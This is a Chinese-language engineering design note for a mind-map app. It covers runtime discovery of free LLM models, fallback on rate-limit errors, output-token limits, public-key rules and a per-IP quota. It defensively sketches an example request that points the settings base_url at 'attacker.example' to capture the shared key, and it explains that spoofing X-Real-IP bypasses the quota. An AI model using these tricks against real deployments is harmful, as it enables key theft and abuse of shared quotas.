# 免费的模型档：为什么是动态的，以及实测到的东西

> 起于 m16558：免费额度不能写死模型名。Command Code 的 coding plan 里标 `:free`
> 的那些模型在活动期间不收费，但**名单不是常驻的**——平台会新上架免费模型，也会把
> 已有的下架，下架之后再用那个名字只会 400。所以选谁是运行时现问的。

代码只有两个文件：`backend/app/generation/free_models.py`（发现与排序）与
`backend/app/settings/store.py` 里那段免费档替换（决定"这一次用不用免费档"）。
开关是 `MINDMAP_FREE_TIER`，**默认关**。

## 1. 为什么默认关

打开它等于改变"这一次生成花谁的钱"。已有部署把密钥放在环境变量里、跑的是付费模型，
升级之后如果默认改走免费档，行为会静默变成**又慢又受每日次数限制**——而界面上只会
出现一个不认识的模型名。所以：

- 关着的时候，请求体与加这个功能之前**逐字节相同**（没有 `reasoning_effort` 这个键，
  `max_tokens` 也不会被抬高）；
- 打开之后，只影响**借用部署方配置的人**（自己没填密钥的那些）。

## 2. API 事实（2026-11-23 实测）

| 事实 | 值 |
| --- | --- |
| 模型列表 | `GET https://api.commandcode.ai/provider/v1/models` |
| 要不要鉴权 | **不需要也返回 200**（无 token 与带 token 的 105 个 id 完全一致）；但 `/chat/completions` 不带 key 是 401 `UNAUTHORIZED` |
| 一次请求耗时 | **22.1 秒 / 21.7 秒**（两次实测） |
| 返回形状 | `{"object":"list","data":[{id, object, created, owned_by, name, context_length, supported_endpoints}]}` |
| 免费标识 | id **以 `:free` 结尾**（用 `endswith`，不用 `in`——`x:free-trial` 可能是计费档） |
| 实测免费模型 | `recursive/flint-v1.0:free`（262K）、`stealth/glyph-cluster:free`（256K），文档标 `FREE`、各 1000 请求/天 |
| 名字必须精确 | 不带 `owner/` 前缀的 `flint-v1.0:free` 直接 400 `unsupported_model` |
| `created` 字段 | **每次请求都变**（服务端按请求时间生成），所以不能用列表内容做哈希判断有没有更新 |
| 流里的 `model` | 只有最后一帧才带 `:free` 后缀（前面是 `stealth/glyph-cluster`）——不能用它判断是否免费 |
| tool calling | 两个免费模型都支持，`finish_reason: tool_calls` |
| 吞吐 | 约 24.6 tok/s（含 reasoning） |

`supported_endpoints` 里必须带 `/chat/completions` 才算可用：105 个模型里有 12 个只
支持 `/messages`（Anthropic 格式）。如果哪天某个免费模型只挂在那条路上，选它出来会
让每次调用都 400，而报错文案（"模型服务返回 HTTP 400"）完全看不出该换模型。

## 3. 三条实测约束 → 三个设计决定

### 约束一：列表要 20 秒以上

**决定：后台线程 + 1 小时 TTL 缓存，列表永远不在请求路径上。**

`free_models()` **永不阻塞**：

- 缓存新鲜 → 直接返回；
- 缓存过期 → 起一个后台 daemon 线程刷新，**这一秒仍然返回旧列表**；
- 一次都没拉到过 → 返回空列表，同时起线程。

第一次调用返回空是**有意**的：为了第一次请求能立刻出结果，宁可这一次报"免费档还没
准备好"（用户点一下重试就好，后台已经拉好了），也不要让每个第一次访问的人都盯着
"正在连接"等 22 秒。

TTL 取 1 小时：上下架不是分钟级事件，而每次刷新要占上游 20 秒。比这更短只增加上游
压力，更长则让新上架的免费模型一整天用不上。

**一个只在失败路径上出现的坑**：刷新失败时必须把 `_REFRESHING` 这个"正在刷新"标记
放掉。只放成功那一侧的话，一次失败会让这个端点**一小时内再也不会重试**
（`_start_refresh` 看到它在集合里就直接返回），表现是"免费档时好时坏、重启之后又
好了"——最像玄学的那种。`test_a_failed_refresh_keeps_the_old_list_and_warns` 钉着它。

### 约束二：`:free` 是唯一标识，且名单会变

**决定：一个模型名都不硬编码，每次刷新都现问。**

排序是"**上下文大的优先，同大按 id 升序**"。上下文优先是因为免费档的常见用途是
"让没有密钥的人也能看到一张完整的图"，上下文越大越不容易在中途撞上窗口上限（那是
一次跑到一半才失败的生成）。id 升序是**确定性**：没有它，同一天里前一次用 flint、
后一次用 glyph，用户会觉得功能时好时坏。

### 约束三：上游偶发 429 / 524

**决定：给出候选序列，一次运行内逐个试。**

实测同一时刻同一 key 连发三次也可能全 200，也会撞上
`{"error":{"message":"Upstream model provider is temporarily unavailable...", "type":"rate_limit_error"}}`。
所以 `candidates(base, tried)` 返回"本次还能试的"，调用方自己记着试过谁——**这个状态
不能放模块级**：那是每请求的东西，放模块级会让并发请求互相污染（A 试过 flint，B 就
永远拿不到 flint）。

后来在生产链路上还撞到 **524**（Cloudflare 的"源站超时"）：免费模型一次响应能跑到
180 秒以上，网关先撑不住（本地实测 `recursive/flint-v1.0:free` 在结构那一步直接回 524）。
它对我们与 502/504 是同一件事——这条路不通了、换一个免费模型往往就通，所以
`UNAVAILABLE_STATUSES = {429, 502, 503, 504, 524}`。

"该换下一个"的判据只有一份：`generation/service.py` 的
`UNAVAILABLE_STATUSES` 与 `_ModelUnavailable`。**400 不在里面**
——它几乎总是"这个请求本身不对"（模型名不支持、参数越界），换模型重发只会把同一个
400 再来一次、还多花一次额度。

两条模型出口都接了这个候选序列，因为它们都得接：

- `backend/app/agent/provider.py::complete_tools`（外层工具循环，每轮一次）；
- `backend/app/generation/service.py::chat_async`（工具内部：骨架 / 结构 / 说明）。

只接一条会得到"agent 那轮换了、写内容那次没换"——AGENTS.md 那条"改一个能力的入口
要检查所有会走到它的路径"讲的就是这个。

## 4. `reasoning_effort`：不给就会白等

两个免费模型**不支持 `off`**（400：`does not support reasoning_effort "off"`），但支持
`low`。不传这个参数时它们的思考会吃掉整个输出预算：

| 配置 | 结果 |
| --- | --- |
| 不传 `reasoning_effort`，`max_tokens=1400` | **56.9 秒**、`completion_tokens=1400`、其中 `reasoning_tokens=1311`、**正文空串**、`finish_reason=length` |
| `reasoning_effort="low"`，带 tools | 8.9 秒、`comp=385 reasoning=316`、`finish=tool_calls` |
| 不传 `reasoning_effort`，`max_tokens=4000` | 正常，`comp=67 reasoning=14 finish=stop` |

所以走免费档时两件事一起做：发 `reasoning_effort: "low"`，并且给 `max_tokens` 一个
**下限** `FREE_MIN_OUTPUT_TOKENS = 4000`（调用方要得更少也抬到 4000）。抬完之后仍要
过 `max_tokens_cap()`——那是服务端真实上限，不能为了凑够 4000 发一个一定会 400 的值。

注意这也是"为什么免费档慢"的一半原因：24.6 tok/s 的吞吐加上每个节点都要写说明，
一张四十节点的图要几分钟。部署方想快就用自己那行填密钥，那样根本不进这一档。

## 4.5 只设下限是错的：上限 `FREE_MAX_OUTPUT_TOKENS = 16000`

第一版只写了 `max(requested, 4000)`，等于什么都没做：调用方（`RunBudget.max_output_tokens`
的默认值）要的是 **65536**，`max(65536, 4000)` 还是 65536。免费模型**按额度大小决定
思考多久**，于是每一次调用都在"可以想 6.5 万 token"的前提下思考。同一份提示词只改
`max_tokens`（`recursive/flint-v1.0:free`，`reasoning_effort=low`，本地实测）：

| `max_tokens` | 耗时 | `reasoning_tokens` | 正文 |
| --- | --- | --- | --- |
| 4000 | 19.9 秒 | 508 | 604 字 |
| 16000 | 36.3 秒 | 1262 | 1912 字 |
| 65536 | **87.7 秒** | 2123 | 1941 字 |

正文到 1900 字左右就不再增长，多出来的额度全花在思考上。整条 `mindmap_generate`
链路的差距（4 次模型调用）：

| 场景 | 总耗时 | 结果 |
| --- | --- | --- |
| 免费档，不限上限 | **549.9 秒** | 撞 `max_seconds`，或勉强完成 |
| 免费档，`max_tokens` 限 16000 | **359.6 秒** | 57 节点，`done` |
| 付费 `z-ai/glm-5.3-flash` | 103.5 秒 | 对照 |

对照组说明了这不是"模型慢"：`z-ai/glm-5.3-flash` 对 `max_tokens` **完全不敏感**
（4000 与 65536 都是 9–10 秒、`reasoning_tokens=30`）。所以问题出在"给免费模型
留了多大的思考预算"，不在模型本身。

**为什么上限是 16000 而不是 4000**：一次结构调用实测需要 1723–2712 字正文 + 最多
2052 的 `reasoning`，4000 会把它截断（`finish_reason=length`），截断的树要靠
`_clip_tree` 回收，代价是节点变少、用户看到一张缺分支的图。16000 在"够写完"与
"不要它多想"之间，并且仍低于 `max_tokens_cap()`。

这个数只对"结构那一次"验算过。**补说明那一次不需要 16000**：它按节点数切两半、
每半最多 40 个节点，而一次写说明的输出成本是 `per_node_tokens(detail_chars=150,
refs=0) ≈ 151` tok/节点（说明不带引用，只有正文），40 个约 6000 tok，16000 有充足
余量。写说明是 `chat_async` 那条出口、不传 `on_delta`，所以它走的是一次性请求，
撞上限的表现是 `_fill_details_half` 收到 `GenerationError` → 那一半全丢（`salvage`
回收不了半截 JSON 里的说明），实测离上限还有一倍以上余量。

两条模型出口（`chat_async` 与 `provider._attempt`）都要夹，`FREE_MAX_OUTPUT_TOKENS`
和 `FREE_MIN_OUTPUT_TOKENS` 一样只在 `resolve()` 标了 `reasoning_effort` 时生效。

**上限还要进"按上限反推容量"的地方**：`agent.tools._max_tokens()` 与它下游的
`_nodes_per_call()` 不发请求，却用这个数算"这次装得下几个节点"。少这一道时免费档
按 65536 规划批次（`max_nodes_for_tokens(65536) = 75` 对 `max_nodes_for_tokens
(16000) = 18`，四倍多），照它切出来的批必然被 `finish_reason=length` 截断。所以
`_max_tokens()` 里除 `max_tokens_cap()` 之外还要过一道
`generation.service.apply_free_tier_ceiling()`。目前 `_nodes_per_call()` 只有
`_generate_deep` 在用（`create_deep` 生产不可达），但这个缺口会在它挂回大图时立刻
生效，所以按"现在就接上"处理。

## 5. 免费模型也要密钥

实测不带 key 请求 `/chat/completions` 是 401 `UNAUTHORIZED`。所以这一档的语义是
**"用部署方那把钥匙、走不收费的模型"**，而不是"不用密钥"。直接后果：

- `store.resolve()` 只在 `api_key_source` 落在 `instance` / `env` / `public` 上时才换模型名；
- `api_key_source: "saved"`（用户自己填了密钥）**不换**——那是他的钱，与免费档无关；
- `api_key_source` 是 `unset` / `unbound` 时也**不换**——连端点或密钥都没有，此刻该
  报的是"去配模型"，不是"换一个免费模型试试"。

## 5.5 公共密钥：谁能用、地址必须是部署方选的

`MINDMAP_FREE_TIER_API_KEY` 是第四批加的**公共**免费密钥（`SOURCE_PUBLIC`）：
没有自己密钥的人借它生成，每人每天有次数上限（`backend/app/generation/quota.py`）。

**地址这一维是这一档的安全前提，不是附带条件。** 判据是
`base_url_source in (SOURCE_INSTANCE, SOURCE_ENV)`（地址来自部署方）**且**
`api_key_source in (SOURCE_INSTANCE, SOURCE_ENV, SOURCE_UNSET)`（没有自己的密钥）。
两项都要在，是因为：

- 如果只看"没有自己的密钥"（写 `api_key_source != SOURCE_SAVED` 这种否定式），任何人
  `PUT /api/settings/model {"base_url": "https://attacker.example/v1"}`（**不带密钥**，
  所以连 `settings_key_unbound` 那道防线都不经过）就能把公共钥匙领走，下一次生成就把
  它发到那个地址。这正是 P0-1 修过的形状——而且只要一步，比 P0-1 的两步更容易。
- 白名单式判据每多一个来源都要有人想一次"它的地址是谁选的"；否定式条件不会。这个
  差别就是上面那个洞的成因。

用户自己写地址却不填密钥时，这里**不给他公共钥匙**，于是 `api_key == ""`、
`configured` 为假，界面说的是"去填密钥"——那是加公共密钥之前的行为。让他的请求发
不出去，比替他挑一把钥匙发到他写的地址上要诚实。

## 6. 降级要留下痕迹

- 拉不到列表 → 保留旧列表 + `WARNING`（有旧列表时说"继续用 N 分钟前的列表"，
  没有时说"暂按没有免费档处理"）；
- 拉到了但**一个免费模型都没有** → 也 `WARNING`。免费活动结束后界面上"用免费档
  生成"会一直失败，日志里没有"当前 0 个免费模型"这句话会让排查从"查日志"变成"猜"；
- 候选全试完 → 抛**最后一个真实原因**（"模型服务返回 HTTP 503"），不要包装成
  "没有候选"：用户看到的文案该说清这一轮到底发生了什么。

## 7. 怎么打开、怎么验证

```bash
# backend/.env 或 /etc/genai-mindmap/env
MINDMAP_FREE_TIER=1
```

打开之后第一次生成会报"免费档还没准备好"（后台在拉列表），隔一分钟再点一次就好。
日志里能看到的判断依据：

```
免费模型列表已刷新：recursive/flint-v1.0:free, stealth/glyph-cluster:free
模型 xxx 暂时不可用，换下一个候选：模型服务返回 HTTP 429
```

面板上"模型"那一栏的来源标签会显示**免费模型**（`model_source: "free"`），而不是
`本站共享配置`——模型名是运行时选的，不是部署方在面板里填的那个。

## 8. 公共额度：每 IP 每天几次

`backend/app/generation/quota.py`。开关就是 `MINDMAP_FREE_TIER_API_KEY` 本身——配了它
就有额度这回事，没配就完全不受限（与免费档 `MINDMAP_FREE_TIER` 是两个独立开关：一个
决定"用哪个模型"，一个决定"用谁的钥匙、能用几次"）。

| 决策 | 值 | 理由 |
| --- | --- | --- |
| 额度 | 每人每天 3 次（`MINDMAP_FREE_QUOTA_LIMIT` 可调，1–100） | 演示够用，又不至于让人把公共额度当免费 API |
| 按什么认人 | **只按 IP**（`X-Real-IP` 优先） | 按 cookie 的话清一下就重置，按账号的话注册一个就重置——两种都让"限 3 次"变成一句空话 |
| 什么时候恢复 | 本地时间第二天零点 | 用 `time.localtime`；**部署必须给 systemd 设 `TZ=Asia/Shanghai`**，否则"明天"从北京时间早八点开始 |
| 什么时候扣 | **开流之前**（`stream_run` 里 `runs.begin` 之前） | 先发后记的话两个并发请求会都看到"还剩 1 次" |
| 什么算一次 | 最后**有候选**才算 | 半棵树交付（`DoneEvent(partial=True)`）真的调过模型，照扣；彻底失败、409、重放都不扣（`refund()`） |
| 用完的响应 | **429** + `code: free_quota_exhausted` + `Retry-After: <到明天零点的秒数>` | 不开流、不建 `runs` 行、不发任何模型调用 |

**降级方向是放开**：额度表读写失败当作"还有额度"。与 `auth/throttle.py` 同一条理由——
反过来会把所有人关在门外，而攻击者没法让表坏掉（他得先拿到写锁）。

**为什么存在 SQLite 而不是内存字典**：重启就回来是这类机制最容易被发现的洞，而这里
本来就有库。

代价要写下来：同一个 NAT 后面的人共享一个池，校园网就是这个情况。选它是因为另一种
代价更大——"清 cookie 就能重置"等于没有限制。

**这一条依赖"后端不能被直连"**：`client_ip()` 优先读 `X-Real-IP`，而那个头是请求方
自己写的。两份 nginx 配置都写 `X-Real-IP $remote_addr`（覆盖客户端传来的值），
`deploy/genai-mindmap.service` 又把 uvicorn 绑在 `127.0.0.1`、compose 只 `expose`
不发布端口——所以在默认部署下客户端改不了它。**一旦有人把 uvicorn 直接暴露到公网
（或外层反代忘了覆盖这个头），每次请求换一个 `X-Real-IP` 就能把"每天 3 次"变成无限**
（审查时实测：同 IP 第 3 次 429，换头之后全部 200）。这是部署约束，不是代码缺陷：
限速与额度都只能信任"我们自己那一跳写进来的地址"。

同理，登录限速（`auth/throttle.py`）按 IP 与账号两个桶取严——**账号桶不受这个头影响**，
所以伪造 `X-Real-IP` 不能用来爆破某个账号的密码，只能用来刷新 IP 桶。

### 8.1 测试连接那一道的"放开内网"开关

`backend/app/settings/probe.py` 的 `_refuse()` 拦三类地址：云元数据（`_METADATA_HOSTS`，
**开关也打不开**）、本机与内网、公网非 `https`。本机与内网那一条可以用
**`MINDMAP_SETTINGS_ALLOW_PRIVATE=1`** 放开——自己机器上跑 Ollama / vLLM / LM Studio
的人必须能测通，否则「模型设置」这个面板对他们等于不存在。

放开的是**本机 + 内网 + 链路本地 + 保留地址**整类，没有更细的开关：这个变量的语义是
"我知道这是私网部署"，而不是"我知道 192.168.1.7 是安全的"。它同时撤掉的还有一道
顺手挡住的边界——如果这台机器能访问内网里的其他服务（Redis、管理面板、另一个模型
网关），那个地址就也能被填进面板并成为探测目标。所以：

- 只在**整台机器都是私网自用**的部署里打开它；
- 打开之后，"谁能改模型地址"这件事更重要：应用层是门禁（匿名被挡）+ `PUT /api/settings/model`
  只有本人能改自己那行 + `POST /model/test` 也过 `_refuse`；nginx 那层**已经不再有
  Basic Auth**（`v0.6.0` 起弃用，见 `docs/DEPLOY.md`），所以外层还有没有别的闸取决于
  部署方自己——`docs/DOCKER.md` 第 11 节写明了"注册是开放的，不想让陌生人进来要在外层限"；
- 云元数据地址**始终拒**，不受这个变量影响——那一条没有"私网自用"的正当理由。

## 9. 这一批没做的事

- **不做主动预热**：进程启动时不去拉列表（那会让启动多 22 秒，且大多数部署不开这个
  开关）。
- **不支持每用户不同的免费名单**：名单是"部署方那台端点"的事实，不是每人的。
- ~~门禁还没上~~：这一条已经过时——账号体系与门禁是同一 PR（#27）的另一片，业务接口
  现在一律要求有身份。额度仍然只限制"走公共免费密钥的生成"，用户自己填了密钥就完全
  不受限（这是刻意的：他花自己的钱）。
- ~~不做登录界面~~：同批落地了（`AuthPanel.vue` + `POST /api/auth/login`）。
